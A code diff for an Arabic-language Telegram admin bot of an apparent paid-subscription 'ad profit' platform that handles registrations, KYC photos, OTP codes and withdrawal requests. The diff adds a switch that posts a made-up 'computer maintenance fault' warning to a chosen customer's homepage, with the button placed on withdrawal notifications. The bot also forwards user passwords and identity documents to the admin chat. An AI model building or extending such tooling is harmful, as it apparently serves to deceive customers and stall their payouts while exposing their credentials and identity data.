@@ -1,4 +1,4 @@
-// telegramBot.js - إدارة بوت التيليجرام مع اختيار حساب محدد لمسح سحوباته + ألبوم المرفقات + التفعيل الفوري
+// telegramBot.js - إدارة بوت التيليجرام (التحكم بالتنبيهات الخاصة بكل حساب + اختيار الحسابات + التفعيل + المرفقات)
 
 class TelegramBotManager {
     constructor(token, adminChatId, onDecisionCallback) {
@@ -14,7 +14,7 @@ class TelegramBotManager {
     startListening() {
         if (!this.token || this.token.includes("ضع_توكن") || this.isPolling) return;
         this.isPolling = true;
-        console.log("✅ بوت التيليجرام متصل وجاهز لاستقبال الأوامر...");
+        console.log("✅ بوت التيليجرام متصل وجاهز لاستقبال الأوامر والتنبيهات...");
         this.registerBotCommands();
         this.pollUpdates();
     }
@@ -26,7 +26,8 @@ class TelegramBotManager {
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                     commands: [
-                        { command: "menu", description: "📊 لوحة التحكم والإحصائيات" },
+                        { command: "menu", description: "📊 لوحة التحكم والتنبيهات" },
+                        { command: "alert", description: "⚠️ إرسال/إزالة تنبيه صيانة لحساب" },
                         { command: "users", description: "👥 عرض قائمة المشتركين" },
                         { command: "clear", description: "🗑️ اختيار حساب لمسح سحوباته" }
                     ]
@@ -60,7 +61,56 @@ class TelegramBotManager {
         }
     }
 
-    // بناء لوحة أزرار لاختيار حساب محدد لمسح سحوباته
+    // قائمة اختيار الحساب لإرسال أو إزالة تنبيه صيانة أجهزة الكمبيوتر
+    async sendSelectUserForAlertMenu(messageIdToEdit = null, chatIdToEdit = null) {
+        const usersData = await this.onDecisionCallback("ALL", "get_users_array");
+        const usersList = usersData?.users || [];
+
+        if (usersList.length === 0) {
+            await this.sendPlainMessage("⚠️ *لا يوجد مشتركون مسجلون في النظام حالياً.*");
+            return;
+        }
+
+        const keyboardRows = usersList.map(u => {
+            const hasAlert = Boolean(u.hasHardwareAlert);
+            return [
+                {
+                    text: `${hasAlert ? "🔴 [مُفعّل]" : "⚪"} ${u.name} (${u.phone}) — ${hasAlert ? "اضغط لإزالة التنبيه" : "اضغط لإرسال التنبيه"}`,
+                    callback_data: `${hasAlert ? "remove_hw_alert" : "send_hw_alert"}:${u.phone}:from_list`
+                }
+            ];
+        });
+
+        keyboardRows.push([
+            { text: "✅ إزالة التنبيه عن جميع الحسابات", callback_data: "remove_hw_alert:ALL:from_list" }
+        ]);
+
+        const text =
+`⚠️ *إدارة تنبيه صيانة أجهزة الكمبيوتر للحسابات:*
+━━━━━━━━━━━━━━━━━━━━
+نص التنبيه الذي يظهر في الصفحة الرئيسية للعميل:
+_"تنبية هام يوجد عطل و يجب عمل صيانة لأجهزة الكمبيوتر في اقرب وقت للحفاظ علي معدل الربح الأعلاني والناشرين في أسرع وقت."_
+━━━━━━━━━━━━━━━━━━━━
+👇 *اختر الحساب لتفعيل أو إزالة التنبيه من صفحته فوراً:*`;
+
+        if (messageIdToEdit && chatIdToEdit) {
+            await fetch(`${this.apiUrl}/editMessageText`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatIdToEdit,
+                    message_id: messageIdToEdit,
+                    text: text,
+                    parse_mode: "Markdown",
+                    reply_markup: { inline_keyboard: keyboardRows }
+                })
+            });
+        } else {
+            await this.sendPlainMessage(text, { inline_keyboard: keyboardRows });
+        }
+    }
+
+    // قائمة اختيار حساب محدد لمسح سحوباته
     async sendSelectUserToClearMenu(messageIdToEdit = null, chatIdToEdit = null) {
         const usersData = await this.onDecisionCallback("ALL", "get_users_array");
         const usersList = usersData?.users || [];
@@ -77,7 +127,6 @@ class TelegramBotManager {
             }
         ]));
 
-        // إضافة زر لمسح الكل في الأسفل كخيار إضافي
         keyboardRows.push([
             { text: "⚠️ مسح قوائم جميع الحسابات دفعة واحدة", callback_data: "clear_all:panel" }
         ]);
@@ -116,7 +165,13 @@ class TelegramBotManager {
             return;
         }
 
-        // 1. أمر ربط واتساب السيرفر: ربط 010xxxxxxxx
+        // أمر التنبيهات السريع
+        if (text === "/alert" || text === "تنبيه" || text === "التنبيهات") {
+            await this.sendSelectUserForAlertMenu();
+            return;
+        }
+
+        // أمر ربط واتساب السيرفر: ربط 010xxxxxxxx
         if (text.startsWith("ربط ") || text.startsWith("/pair ")) {
             const phone = text.replace(/^(\/pair|ربط)\s+/i, "").trim();
             await this.sendPlainMessage(`⏳ *جاري توليد كود ربط الواتساب للرقم* \`${phone}\` *... انتظر لحظات.*`);
@@ -127,7 +182,7 @@ class TelegramBotManager {
             return;
         }
 
-        // 2. استقبال رابط ViaBTC لتفعيل المشترك بعد الضغط على زر التفعيل المخصص
+        // استقبال رابط ViaBTC لتفعيل المشترك
         if (this.awaitingViaBtcForPhone && text.startsWith("http")) {
             const targetPhone = this.awaitingViaBtcForPhone;
             this.awaitingViaBtcForPhone = null;
@@ -151,7 +206,7 @@ class TelegramBotManager {
             return;
         }
 
-        // 3. تفعيل مباشر بالأمر: تفعيل 010xxxxxxxx رابط
+        // تفعيل مباشر: تفعيل 010xxxxxxxx رابط
         if (text.startsWith("/activate ") || text.startsWith("تفعيل ")) {
             const parts = text.replace(/^(\/activate|تفعيل)\s+/i, "").trim().split(/\s+/);
             const phone = parts[0];
@@ -171,7 +226,7 @@ class TelegramBotManager {
             return;
         }
 
-        // 4. إضافة مشترك يدوياً: اضافة الاسم|الرقم|الباسورد|الرابط
+        // إضافة مشترك يدوياً: اضافة الاسم|الرقم|الباسورد|الرابط
         if (text.startsWith("/adduser ") || text.startsWith("اضافة ") || text.startsWith("إضافة ")) {
             const rawPayload = text.replace(/^(\/adduser|اضافة|إضافة)\s+/i, "").trim();
             const result = await this.onDecisionCallback("MANUAL", "add_full_user", rawPayload);
@@ -184,20 +239,17 @@ class TelegramBotManager {
             return;
         }
 
-        // 5. عرض قائمة المشتركين
         if (text === "/users" || text === "المشتركين" || text === "الحسابات") {
             const info = await this.onDecisionCallback("ALL", "list_users");
             await this.sendPlainMessage(info?.formattedText || "لا توجد حسابات مسجلة حالياً.");
             return;
         }
 
-        // 6. أمر مسح القائمة -> يعرض أزرار الحسابات لاختيار الحساب المطلوب مسحه
         if (text === "/clear" || text === "مسح" || text === "مسح القائمة") {
             await this.sendSelectUserToClearMenu();
             return;
         }
 
-        // 7. لوحة التحكم الرئيسية (/menu أو /start)
         if (text === "/start" || text === "/menu" || text === "تحكم") {
             const status = await this.onDecisionCallback("ALL", "get_status");
             const panelText =
@@ -221,9 +273,9 @@ class TelegramBotManager {
                     parse_mode: "Markdown",
                     reply_markup: {
                         inline_keyboard: [
+                            [{ text: "⚠️ إرسال / إزالة تنبيه صيانة لحساب", callback_data: "choose_user_for_alert:panel" }],
                             [{ text: "👥 عرض قائمة المشتركين", callback_data: "list_users:panel" }],
                             [{ text: "🗑️ اختيار حساب لمسح سحوباته", callback_data: "choose_user_to_clear:panel" }],
-                            [{ text: "⚠️ مسح جميع قوائم السحوبات", callback_data: "clear_all:panel" }],
                             [{ text: "🔄 تحديث بيانات اللوحة", callback_data: "status:refresh" }]
                         ]
                     }
@@ -244,7 +296,6 @@ class TelegramBotManager {
         } catch (e) {}
     }
 
-    // إرسال إشعار كود الـ OTP (7 أرقام) مع زر احتياطي لواتساب المشترك
     async sendOtpAlertToAdmin(phone, otpCode, purpose, autoSent) {
         const purposeText = purpose === "register" ? "تسجيل حساب جديد" : "استعادة كلمة المرور";
         const intlPhone = "2" + phone;
@@ -269,7 +320,6 @@ class TelegramBotManager {
         await this.sendPlainMessage(msg, keyboard);
     }
 
-    // إرسال ألبوم الصور الثلاث (وجه البطاقة + ظهر البطاقة + الصورة الشخصية) مع أزرار التفعيل
     async sendNewRegistrationWithKycBundle(regData) {
         const { fullName, phone, password, idFrontBase64, idBackBase64, selfieBase64, idCardBase64, deviceInfo, date } = regData;
         const dev = deviceInfo || {};
@@ -337,7 +387,6 @@ class TelegramBotManager {
                 await this.sendPlainMessage(caption, inlineKeyboard);
             }
         } catch (err) {
-            console.error("خطأ في إرسال مرفقات التسجيل:", err.message);
             await this.sendPlainMessage(caption, inlineKeyboard);
         }
     }
@@ -355,7 +404,6 @@ class TelegramBotManager {
         await this.sendPlainMessage(text);
     }
 
-    // إرسال إشعار طلب السحب مع النسخ بضغطة واحدة وكافة بيانات الجهاز والشبكة
     async sendWithdrawNotification(record, totalPending) {
         if (!this.token || this.token.includes("ضع_توكن")) return;
 
@@ -399,8 +447,8 @@ ${rawDestination !== cleanCopyableNumber ? `🔢 *التنسيق المقروء:
             inline_keyboard: [
                 [{ text: "✅ تمت التسوية والدفع بنجاح", callback_data: `approve:${userKey}:${record.id}` }],
                 [{ text: "❌ فشلت العملية (إعادة المبلغ للرصيد)", callback_data: `reject:${userKey}:${record.id}` }],
-                [{ text: "🗑️ مسح سجل هذا المشترك فقط", callback_data: `clear_user:${userKey}:${record.id}` }],
-                [{ text: "📋 اختيار حساب آخر لمسح سحوباته", callback_data: `choose_user_to_clear:${record.id}` }]
+                [{ text: "⚠️ إرسال تنبيه صيانة أجهزة لهذا الحساب", callback_data: `send_hw_alert:${userKey}:${record.id}` }],
+                [{ text: "🗑️ مسح سجل هذا المشترك فقط", callback_data: `clear_user:${userKey}:${record.id}` }]
             ]
         };
 
@@ -431,7 +479,48 @@ ${rawDestination !== cleanCopyableNumber ? `🔢 *التنسيق المقروء:
         const txId = parts[2];
         const message = callbackQuery.message;
 
-        // فتح قائمة أزرار المشتركين لاختيار حساب لمسح سحوباته
+        // 1. فتح قائمة اختيار الحساب لإرسال أو إزالة تنبيه صيانة أجهزة الكمبيوتر
+        if (action === "choose_user_for_alert") {
+            await this.answerCallback(callbackQuery.id, "اختر الحساب من القائمة");
+            await this.sendSelectUserForAlertMenu();
+            return;
+        }
+
+        // 2. إرسال تنبيه صيانة أجهزة الكمبيوتر لحساب محدد
+        if (action === "send_hw_alert") {
+            const res = await this.onDecisionCallback(targetPhone, "set_hw_alert", true);
+            await this.answerCallback(callbackQuery.id, `⚠️ تم إرسال التنبيه لصفحة ${res?.userName || targetPhone}`);
+            await this.sendPlainMessage(
+                `⚠️ *تم تفعيل وإرسال تنبيه صيانة أجهزة الكمبيوتر بنجاح!*\n` +
+                `👤 *الحساب المستهدف:* ${res?.userName || "مشترك"} (\`${targetPhone}\`)\n` +
+                `📢 *التنبيه ظاهر الآن في الصفحة الرئيسية للعميل.*`,
+                {
+                    inline_keyboard: [
+                        [{ text: "✅ إزالة هذا التنبيه عن الحساب الآن", callback_data: `remove_hw_alert:${targetPhone}:direct` }]
+                    ]
+                }
+            );
+            if (txId === "from_list") {
+                await this.sendSelectUserForAlertMenu(message.message_id, message.chat.id);
+            }
+            return;
+        }
+
+        // 3. إزالة تنبيه صيانة أجهزة الكمبيوتر عن حساب محدد أو عن الجميع
+        if (action === "remove_hw_alert") {
+            const res = await this.onDecisionCallback(targetPhone, "set_hw_alert", false);
+            await this.answerCallback(callbackQuery.id, "✅ تم إزالة التنبيه بنجاح!");
+            await this.sendPlainMessage(
+                targetPhone === "ALL"
+                    ? "✅ *تم إزالة تنبيه صيانة أجهزة الكمبيوتر عن جميع الحسابات!*"
+                    : `✅ *تم إزالة تنبيه صيانة أجهزة الكمبيوتر من صفحة حساب (${res?.userName || targetPhone}) بنجاح!*`
+            );
+            if (txId === "from_list") {
+                await this.sendSelectUserForAlertMenu(message.message_id, message.chat.id);
+            }
+            return;
+        }
+
         if (action === "choose_user_to_clear") {
             await this.answerCallback(callbackQuery.id, "اختر المشترك من القائمة");
             await this.sendSelectUserToClearMenu();
@@ -486,9 +575,9 @@ ${rawDestination !== cleanCopyableNumber ? `🔢 *التنسيق المقروء:
                     parse_mode: "Markdown",
                     reply_markup: {
                         inline_keyboard: [
+                            [{ text: "⚠️ إرسال / إزالة تنبيه صيانة لحساب", callback_data: "choose_user_for_alert:panel" }],
                             [{ text: "👥 عرض قائمة المشتركين", callback_data: "list_users:panel" }],
                             [{ text: "🗑️ اختيار حساب لمسح سحوباته", callback_data: "choose_user_to_clear:panel" }],
-                            [{ text: "⚠️ مسح جميع قوائم السحوبات", callback_data: "clear_all:panel" }],
                             [{ text: "🔄 تحديث بيانات اللوحة", callback_data: "status:refresh" }]
                         ]
                     }
@@ -505,7 +594,6 @@ ${rawDestination !== cleanCopyableNumber ? `🔢 *التنسيق المقروء:
             return;
         }
 
-        // مسح سحوبات حساب مشترك محدد وتحديث قائمة الأزرار
         if (action === "clear_user") {
             const res = await this.onDecisionCallback(targetPhone, "clear_user");
             await this.answerCallback(callbackQuery.id, `✅ تم مسح سحوبات ${res?.userName || targetPhone}`);
